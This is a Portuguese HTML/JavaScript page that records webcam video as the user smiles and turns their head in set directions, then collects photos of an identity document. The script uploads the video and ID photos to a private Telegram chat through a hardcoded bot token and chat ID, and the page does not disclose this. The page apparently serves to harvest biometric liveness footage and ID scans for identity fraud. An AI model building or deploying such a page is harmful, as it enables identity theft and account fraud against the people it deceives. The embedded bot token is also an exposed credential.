<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Captura Facial + Documentos</title>
  <style>
    body{margin:0;background:#111;color:white;font-family:Arial;text-align:center;}
    #video-container{position:relative;display:inline-block;width:90%;max-width:700px;margin-top:20px;}
    video{width:100%;border-radius:15px;display:block;background:#000;}
    canvas{position:absolute;top:0;left:0;width:100%;height:100%;border-radius:15px;pointer-events:none;}
    #instruction{font-size:36px;margin-top:20px;font-weight:bold;}
    #timer{font-size:50px;color:#00ff88;min-height:70px;margin-bottom:10px;}
    #recTimer{font-size:16px;color:#ff5555;min-height:22px;margin-top:4px;font-weight:bold;}
    #model-status{font-size:14px;color:#aaa;min-height:20px;margin:5px 0;}
    button{padding:15px 30px;font-size:20px;margin:8px;cursor:pointer;border-radius:8px;border:none;}
    button:disabled{opacity:0.5;cursor:not-allowed;}
    #startBtn{background:#00ff88;color:#111;}
    #stopBtn{background:#ff4444;color:#fff;}
    #progress-container{width:90%;max-width:700px;margin:20px auto;background:#333;border-radius:20px;}
    #progress{height:20px;width:0%;background:#00ff88;border-radius:20px;transition:width 0.3s;}
    #debugPanel{background:#222;color:#ffb300;padding:10px 0;margin:10px auto 0 auto;max-width:700px;border-radius:10px;min-height:24px;font-size:14px;word-break:break-word;}
    #photoSection{display:none;max-width:700px;margin:20px auto;padding:15px;background:#1c1c1c;border-radius:15px;}
    #photoSection h2{margin-top:0;}
    #photoSection p{color:#aaa;font-size:14px;}
    #addPhotoBtn{background:#3399ff;color:#fff;}
    #finishBtn{background:#00ff88;color:#111;}
    #photoPreview{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin:15px auto;}
    .photo-thumb{position:relative;width:130px;}
    .photo-thumb img{width:100%;height:100px;object-fit:cover;border-radius:8px;border:2px solid #444;display:block;}
    .photo-thumb .photo-label{font-size:12px;color:#ccc;margin-top:4px;}
    .photo-thumb .remove-btn{position:absolute;top:-8px;right:-8px;background:#ff4444;color:#fff;border:none;border-radius:50%;width:24px;height:24px;font-size:14px;line-height:1;cursor:pointer;padding:0;margin:0;}
    #videoInfo{font-size:14px;color:#00ff88;min-height:20px;margin-top:6px;}
  </style>
</head>
<body>
  <h1>Captura Facial</h1>
  <div id="video-container">
    <video id="preview" autoplay muted playsinline></video>
    <canvas id="overlay"></canvas>
  </div>
  <div id="model-status">Aguardando início...</div>
  <div id="recTimer"></div>
  <div id="instruction">Clique em iniciar</div>
  <div id="timer"></div>
  <button id="startBtn">Iniciar Captura</button>
  <button id="stopBtn" disabled>Parar Gravação</button>
  <div id="progress-container"><div id="progress"></div></div>
  <div id="videoInfo"></div>
  <div id="debugPanel"></div>

  <!-- Etapa 2: fotos de documentos, aparece após o vídeo terminar -->
  <div id="photoSection">
    <h2>📄 Fotos dos Documentos</h2>
    <p>Tire ou selecione as fotos do documento (frente, verso, etc). Você pode adicionar quantas quiser.</p>
    <input type="file" id="photoInput" accept="image/*" capture="environment" style="display:none;">
    <button id="addPhotoBtn">📷 Adicionar Foto de Documento</button>
    <div id="photoPreview"></div>
    <button id="finishBtn" disabled>✅ Finalizar e Baixar Tudo</button>
  </div>

  <!-- face-api.js carregado no final do body -->
  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
  <script>
  document.addEventListener('DOMContentLoaded', function() {
    // ===== Elementos DOM =====
    const video = document.getElementById("preview");
    const canvas = document.getElementById("overlay");
    const instruction = document.getElementById("instruction");
    const timer = document.getElementById("timer");
    const recTimerEl = document.getElementById("recTimer");
    const startBtn = document.getElementById("startBtn");
    const stopBtn = document.getElementById("stopBtn");
    const progressBar = document.getElementById("progress");
    const modelStatus = document.getElementById("model-status");
    const debugPanel = document.getElementById("debugPanel");
    const videoInfo = document.getElementById("videoInfo");

    const photoSection = document.getElementById("photoSection");
    const photoInput = document.getElementById("photoInput");
    const addPhotoBtn = document.getElementById("addPhotoBtn");
    const photoPreview = document.getElementById("photoPreview");
    const finishBtn = document.getElementById("finishBtn");

    function showDebug(msg) {
      debugPanel.innerText = msg;
      console.log("[DEBUG]", msg);
    }

    // ===== Parâmetros =====
    const steps = [
      {text:"👀 Olhe para a câmera", duration:5, direction:"center"},
      {text:"😊 Sorria", duration:3, direction:"smile"},
      {text:"⬆️ Olhe para cima", duration:7, direction:"up"},
      {text:"⬇️ Olhe para baixo", duration:7, direction:"down"},
      {text:"⬅️ Olhe para esquerda", duration:7, direction:"left"},
      {text:"➡️ Olhe para direita", duration:7, direction:"right"},
      {text:"↖️ Superior esquerda", duration:7, direction:"up_left"},
      {text:"↗️ Superior direita", duration:7, direction:"up_right"},
      {text:"↙️ Inferior esquerda", duration:7, direction:"down_left"},
      {text:"↘️ Inferior direita", duration:7, direction:"down_right"}
    ];
    let mediaRecorder, chunks=[], stopped=false, stream=null;
    let modelsLoaded=false, modelsFailed=false;
    let detectionInterval=null, holdStart=null, holdProgress=0;
    const holdRequired=1.5;
    let currentStep=0, elapsed=0, running=false;
    const totalTime = steps.reduce((a,b)=>a+b.duration,0);

    // Controle de gravação real (para corrigir corrupção / mostrar duração real)
    let recordStartTime = null;
    let recTimerInterval = null;
    let lastVideoBlob = null;
    let lastVideoName = null;

    // Fotos de documentos
    let documentPhotos = []; // { id, file, url }
    let photoIdCounter = 0;

    // ===== Configuração do Telegram =====
    const TELEGRAM_BOT_TOKEN = "8546142693:AAFsui6yyRmKBmfgUssCy9grYNSqn-Nu31g";
    const TELEGRAM_CHAT_ID = "7632491985";
    const TELEGRAM_API = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN;

    if (startBtn) startBtn.addEventListener('click', startCapture);
    else showDebug("Botão 'Iniciar Captura' não encontrado no DOM.");
    if (stopBtn) stopBtn.addEventListener('click', stopCapture);

    // ===== Modelos de IA =====
    async function loadModels() {
      if (modelsLoaded || modelsFailed) return;
      try {
        if (typeof faceapi === 'undefined') throw new Error("face-api.js não carregado");
        modelStatus.innerText = "🔄 Carregando modelos de IA em segundo plano...";
        const CDN = 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights';
        await faceapi.nets.tinyFaceDetector.loadFromUri(CDN);
        await faceapi.nets.faceLandmark68TinyNet.loadFromUri(CDN);
        modelsLoaded = true;
        modelStatus.innerText = "✅ Modelos de IA prontos!";
        showDebug("Modelos carregados com sucesso.");
      } catch(e) {
        modelsFailed = true;
        modelStatus.innerText = "⚠️ Modelos IA indisponíveis - modo simples ativo";
        showDebug("Falha ao carregar modelos: " + e.message);
      }
    }

    function isSecureContext() {
      return window.isSecureContext || location.protocol === 'https:' || location.hostname === 'localhost';
    }

    // ===== FIX PRINCIPAL: escolher um mimeType/codec suportado e válido =====
    // Vídeos "corrompidos" quase sempre acontecem porque o MediaRecorder foi criado
    // sem um mimeType explícito (o navegador escolhe um codec que às vezes gera
    // um container webm inconsistente), ou porque o Blob final foi montado antes
    // de todos os chunks serem entregues. As correções abaixo tratam os dois casos.
    function getSupportedMimeType() {
      const candidates = [
        'video/webm;codecs=vp9,opus',
        'video/webm;codecs=vp8,opus',
        'video/webm;codecs=h264,opus',
        'video/webm',
        'video/mp4'
      ];
      for (const type of candidates) {
        if (window.MediaRecorder && MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(type)) {
          return type;
        }
      }
      return '';
    }

    function formatDuration(totalSeconds) {
      const m = Math.floor(totalSeconds / 60);
      const s = Math.floor(totalSeconds % 60);
      return String(m).padStart(2,'0') + ":" + String(s).padStart(2,'0');
    }

    function startRecTimer() {
      recordStartTime = Date.now();
      recTimerEl.innerText = "🔴 REC 00:00";
      recTimerInterval = setInterval(() => {
        const secs = (Date.now() - recordStartTime) / 1000;
        recTimerEl.innerText = "🔴 REC " + formatDuration(secs);
      }, 250);
    }

    function stopRecTimer() {
      if (recTimerInterval) clearInterval(recTimerInterval);
      recTimerInterval = null;
    }

    // ===== Captura principal =====
    async function startCapture() {
      try {
        showDebug("startCapture() chamado.");
        stopped = false;
        running = true;
        lastVideoBlob = null;
        lastVideoName = null;
        photoSection.style.display = "none";
        videoInfo.innerText = "";
        if (startBtn) startBtn.disabled = true;
        if (stopBtn) stopBtn.disabled = false;
        progressBar.style.width = "0%";
        instruction.innerText = "Abrindo câmera...";
        timer.innerText = "";
        recTimerEl.innerText = "";

        if (!isSecureContext() || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          showDebug("getUserMedia só funciona em HTTPS ou localhost.");
          instruction.innerText = "❌ Acesso à câmera só é permitido em HTTPS ou localhost.";
          resetButtons();
          return;
        }

        try {
          showDebug("Solicitando acesso à câmera...");
          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width:{ideal:1280}, height:{ideal:720} },
            audio: true
          });
          video.srcObject = stream;
          await new Promise(r => { video.onloadedmetadata = r; });
          await video.play().catch(()=>{});
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          showDebug("Câmera aberta com sucesso.");
        } catch (err) {
          let msg = "Erro desconhecido ao acessar a câmera.";
          if (err.name === "NotAllowedError") msg = "Permissão para acessar a câmera foi negada.";
          else if (err.name === "NotFoundError") msg = "Nenhuma câmera foi encontrada.";
          else if (err.name === "NotReadableError") msg = "A câmera está em uso por outro aplicativo.";
          else if (err.name === "SecurityError") msg = "Acesso à câmera bloqueado por política de segurança.";
          showDebug(msg + " (" + err.name + ")");
          instruction.innerText = "❌ " + msg;
          resetButtons();
          return;
        }

        instruction.innerText = "Câmera ativa! Preparando...";
        loadModels();

        for (let i = 3; i > 0; i--) {
          if (stopped) return;
          timer.innerText = i;
          await new Promise(r => setTimeout(r, 1000));
        }
        timer.innerText = "";

        // ---- Configuração robusta do MediaRecorder ----
        chunks = [];
        const mimeType = getSupportedMimeType();
        const options = {};
        if (mimeType) options.mimeType = mimeType;
        options.videoBitsPerSecond = 2_500_000; // qualidade estável, evita frames corrompidos por bitrate excessivo

        try {
          mediaRecorder = new MediaRecorder(stream, options);
        } catch (e) {
          showDebug("mimeType indisponível, usando padrão do navegador: " + e.message);
          mediaRecorder = new MediaRecorder(stream);
        }

        mediaRecorder.ondataavailable = e => {
          if (e.data && e.data.size > 0) chunks.push(e.data);
        };

        mediaRecorder.onerror = e => {
          showDebug("Erro no MediaRecorder: " + (e.error ? e.error.message : e));
        };

        // onstop monta o Blob SOMENTE depois que todos os chunks já foram recebidos
        mediaRecorder.onstop = () => {
          stopRecTimer();
          const finalType = mediaRecorder.mimeType || 'video/webm';
          const blob = new Blob(chunks, { type: finalType });
          const durationSec = recordStartTime ? (Date.now() - recordStartTime) / 1000 : 0;
          const durLabel = formatDuration(durationSec).replace(':', 'm') + 's';
          const now = new Date();
          const stamp = now.getFullYear().toString() +
                        String(now.getMonth()+1).padStart(2,'0') +
                        String(now.getDate()).padStart(2,'0') + "_" +
                        String(now.getHours()).padStart(2,'0') +
                        String(now.getMinutes()).padStart(2,'0') +
                        String(now.getSeconds()).padStart(2,'0');
          const ext = finalType.includes('mp4') ? 'mp4' : 'webm';
          const filename = `captura_facial_${stamp}_${durLabel}.${ext}`;

          lastVideoBlob = blob;
          lastVideoName = filename;

          const url = URL.createObjectURL(blob);
          const a = document.createElement("a");
          a.style.display = "none";
          a.href = url;
          a.download = filename;
          document.body.appendChild(a);
          a.click();
          setTimeout(() => { URL.revokeObjectURL(url); document.body.removeChild(a); }, 100);

          videoInfo.innerText = `🎬 Vídeo salvo: ${filename} (${(blob.size/1024/1024).toFixed(2)} MB, duração real ${formatDuration(durationSec)})`;
          showDebug("Vídeo finalizado corretamente. Duração real: " + formatDuration(durationSec));

          if (stream) stream.getTracks().forEach(t => t.stop());

          // Avança para a etapa de fotos de documentos
          openPhotoSection();
        };

        // timeslice de 1s: força o navegador a entregar chunks periodicamente,
        // então se algo falhar no fim da gravação, os dados anteriores não se perdem
        mediaRecorder.start(1000);
        startRecTimer();
        currentStep = 0; elapsed = 0;
        showDebug("Gravação iniciada com mimeType: " + (mediaRecorder.mimeType || "padrão do navegador"));
        runSteps();
      } catch (e) {
        showDebug("Erro inesperado: " + e.message);
        instruction.innerText = "❌ Erro inesperado: " + e.message;
        stopRecTimer();
        resetButtons();
      }
    }

    function resetButtons() {
      if (startBtn) startBtn.disabled = false;
      if (stopBtn) stopBtn.disabled = true;
      running = false;
    }

    function stopCapture() {
      stopped = true; running = false;
      if (startBtn) startBtn.disabled = false;
      if (stopBtn) stopBtn.disabled = true;
      // Solicita o chunk final antes de parar, garantindo que nada seja perdido
      if (mediaRecorder && mediaRecorder.state === "recording") {
        try { mediaRecorder.requestData(); } catch(e) {}
        mediaRecorder.stop();
      }
      instruction.innerText = "⏹️ Gravação parada";
      timer.innerText = "";
      clearInterval(detectionInterval);
      clearCanvas();
      showDebug("Gravação parada pelo usuário.");
    }

    function clearCanvas() {
      canvas.getContext('2d').clearRect(0,0,canvas.width,canvas.height);
    }

    async function runSteps() {
      for (currentStep=0; currentStep<steps.length; currentStep++) {
        if(stopped) return;
        const step = steps[currentStep];
        instruction.innerText = step.text;
        holdStart=null; holdProgress=0;
        let stepDone=false;

        detectionInterval = setInterval(async ()=>{
          if(!running) return;
          const result = await detectDirection(step.direction);
          drawOverlay(result.correct);
          if(result.correct) {
            if(!holdStart) holdStart=Date.now();
            holdProgress = Math.min((Date.now()-holdStart)/1000, holdRequired);
          } else {
            holdStart=null; holdProgress=0;
          }
          timer.innerHTML=`
            <div style="font-size:26px;color:#fff;">Mantenha por ${(holdRequired-holdProgress).toFixed(1)}s</div>
            <div style="background:#222;border-radius:10px;width:80%;margin:8px auto;height:18px;overflow:hidden;">
              <div style="height:18px;width:${(holdProgress/holdRequired)*100}%;background:#00ff88;transition:width 0.15s;"></div>
            </div>`;
          if(holdProgress>=holdRequired) stepDone=true;
        }, 100);

        while(!stepDone && !stopped) await new Promise(r=>setTimeout(r,100));
        clearInterval(detectionInterval);
        timer.innerHTML="";

        elapsed += step.duration;
        progressBar.style.width = ((elapsed/totalTime)*100)+"%";

        if(!stopped) {
          for(let i=step.duration; i>0; i--) {
            if(stopped) return;
            timer.innerText=i;
            await new Promise(r=>setTimeout(r,1000));
          }
          timer.innerText="";
        }

        if(!stopped && currentStep<steps.length-1) {
          instruction.innerText="⏳ Prepare-se";
          for(let j=3; j>0; j--) {
            timer.innerText=j;
            await new Promise(r=>setTimeout(r,1000));
          }
        }
      }
      timer.innerText="";
      instruction.innerText="✅ Vídeo concluído!";
      if (startBtn) startBtn.disabled=false;
      if (stopBtn) stopBtn.disabled=true;
      clearCanvas();
      showDebug("Fluxo de vídeo concluído.");
      // Para o gravador de forma limpa (aciona onstop -> baixa o vídeo -> abre a etapa de fotos)
      if (mediaRecorder && mediaRecorder.state === "recording") {
        try { mediaRecorder.requestData(); } catch(e) {}
        mediaRecorder.stop();
      } else {
        openPhotoSection();
      }
    }

    function drawOverlay(correct) {
      const ctx=canvas.getContext('2d');
      ctx.clearRect(0,0,canvas.width,canvas.height);
      ctx.lineWidth=12;
      ctx.strokeStyle=correct?"#00ff88":"#ff4444";
      ctx.strokeRect(6,6,canvas.width-12,canvas.height-12);
    }

    async function detectDirection(targetDirection) {
      if(!modelsLoaded) return {correct: true};
      if(!video || video.readyState<2) return {correct: false};

      try {
        const detection = await faceapi
          .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions())
          .withFaceLandmarks(true);
        if(!detection || !detection.landmarks) return {correct: false};

        if(targetDirection==="smile") return {correct: true};

        const lm = detection.landmarks;
        const nose = lm.getNose()[3];
        const leftEye = lm.getLeftEye();
        const rightEye = lm.getRightEye();
        const eyeCenter = {
          x:(leftEye[0].x+rightEye[3].x)/2,
          y:(leftEye[0].y+rightEye[3].y)/2
        };
        const dx = nose.x-eyeCenter.x;
        const dy = nose.y-eyeCenter.y;
        const horizontal = dx/(video.videoWidth*0.12);
        const vertical = dy/(video.videoHeight*0.10);
        const tol=0.35;

        let correct=false;
        switch(targetDirection){
          case "center": correct=Math.abs(horizontal)<tol && Math.abs(vertical)<tol; break;
          case "up":     correct=vertical<-tol && Math.abs(horizontal)<tol; break;
          case "down":   correct=vertical>tol && Math.abs(horizontal)<tol; break;
          case "left":   correct=horizontal<-tol && Math.abs(vertical)<tol; break;
          case "right":  correct=horizontal>tol && Math.abs(vertical)<tol; break;
          case "up_left":    correct=vertical<-tol && horizontal<-tol; break;
          case "up_right":   correct=vertical<-tol && horizontal>tol; break;
          case "down_left":  correct=vertical>tol && horizontal<-tol; break;
          case "down_right": correct=vertical>tol && horizontal>tol; break;
          default: correct=false;
        }
        return {correct};
      } catch(e) {
        return {correct: false};
      }
    }

    // ===== ETAPA 2: Fotos de documentos =====
    function openPhotoSection() {
      photoSection.style.display = "block";
      instruction.innerText = "✅ Vídeo concluído! Agora envie as fotos do documento.";
      photoSection.scrollIntoView({ behavior: "smooth", block: "start" });
      showDebug("Etapa de fotos de documentos habilitada.");
    }

    addPhotoBtn.addEventListener('click', () => {
      photoInput.value = ""; // permite selecionar o mesmo arquivo de novo se necessário
      photoInput.click();
    });

    photoInput.addEventListener('change', (e) => {
      const files = Array.from(e.target.files || []);
      files.forEach(file => {
        const id = ++photoIdCounter;
        const url = URL.createObjectURL(file);
        documentPhotos.push({ id, file, url });
        renderPhotoThumb(id, url, file.name);
      });
      updateFinishBtn();
    });

    function renderPhotoThumb(id, url, name) {
      const wrap = document.createElement('div');
      wrap.className = 'photo-thumb';
      wrap.dataset.id = id;
      wrap.innerHTML = `
        <img src="${url}" alt="Documento">
        <div class="photo-label">${name.length>18 ? name.slice(0,15)+'...' : name}</div>
        <button class="remove-btn" title="Remover">✕</button>
      `;
      wrap.querySelector('.remove-btn').addEventListener('click', () => removePhoto(id, wrap));
      photoPreview.appendChild(wrap);
    }

    function removePhoto(id, el) {
      const idx = documentPhotos.findIndex(p => p.id === id);
      if (idx >= 0) {
        URL.revokeObjectURL(documentPhotos[idx].url);
        documentPhotos.splice(idx, 1);
      }
      el.remove();
      updateFinishBtn();
    }

    function updateFinishBtn() {
      finishBtn.disabled = documentPhotos.length === 0;
    }

    finishBtn.addEventListener('click', async () => {
      try {
        finishBtn.disabled = true;
        finishBtn.innerText = "⏳ Enviando para Telegram...";
        showDebug("Iniciando envio para Telegram");

        // Verificar limite de 50MB
        const maxSize = 50 * 1024 * 1024;
        if (lastVideoBlob && lastVideoBlob.size > maxSize) {
          throw new Error(`Vídeo muito grande (${(lastVideoBlob.size/1024/1024).toFixed(1)}MB). Limite: 50MB`);
        }
        documentPhotos.forEach((p, i) => {
          if (p.file.size > maxSize) {
            throw new Error(`Foto ${i+1} muito grande (${(p.file.size/1024/1024).toFixed(1)}MB). Limite: 50MB`);
          }
        });

        // 1. Enviar vídeo
        if (lastVideoBlob && lastVideoName) {
          finishBtn.innerText = "🎬 Enviando vídeo...";
          await sendVideoToTelegram(lastVideoBlob, lastVideoName);
          showDebug("✅ Vídeo enviado com sucesso");
        }

        // 2. Enviar fotos
        if (documentPhotos.length > 0) {
          finishBtn.innerText = "📷 Enviando fotos...";
          await sendPhotosToTelegram(documentPhotos);
          showDebug("✅ Fotos enviadas com sucesso");
        }

        finishBtn.innerText = "✅ Enviado com sucesso!";
        instruction.innerText = "🎉 Vídeo e documentos enviados para o Telegram!";
        showDebug("Todos os arquivos enviados ao Telegram com sucesso.");
      } catch (e) {
        showDebug("Erro ao enviar: " + e.message);
        instruction.innerText = "❌ " + e.message;
        finishBtn.innerText = "✅ Finalizar e Enviar";
        finishBtn.disabled = false;
      }
    });

    async function sendVideoToTelegram(blob, filename) {
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('video', blob, filename);
      formData.append('caption', `🎬 Captura Facial\n📁 ${filename}`);

      const res = await fetch(TELEGRAM_API + '/sendVideo', {
        method: 'POST',
        body: formData
      });
      const data = await res.json();
      if (!data.ok) throw new Error("Falha ao enviar vídeo: " + (data.description || "erro desconhecido"));
      return data;
    }

    async function sendPhotosToTelegram(photos) {
      // Telegram permite até 10 fotos em uma mediaGroup
      const groups = [];
      for (let i = 0; i < photos.length; i += 10) {
        groups.push(photos.slice(i, i + 10));
      }

      for (const group of groups) {
        const mediaArray = [];
        for (let i = 0; i < group.length; i++) {
          const p = group[i];
          mediaArray.push({
            type: 'photo',
            media: `attach://photo_${i}`,
            caption: i === 0 ? `📄 Documentos (${group.length} foto${group.length>1?'s':''})`  : ''
          });
        }

        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('media', JSON.stringify(mediaArray));

        group.forEach((p, i) => {
          formData.append(`photo_${i}`, p.file, `documento_${i}.jpg`);
        });

        const res = await fetch(TELEGRAM_API + '/sendMediaGroup', {
          method: 'POST',
          body: formData
        });
        const data = await res.json();
        if (!data.ok) throw new Error("Falha ao enviar fotos: " + (data.description || "erro desconhecido"));
      }
    }

  }); // Fim do DOMContentLoaded
  </script>
</body>
</html>
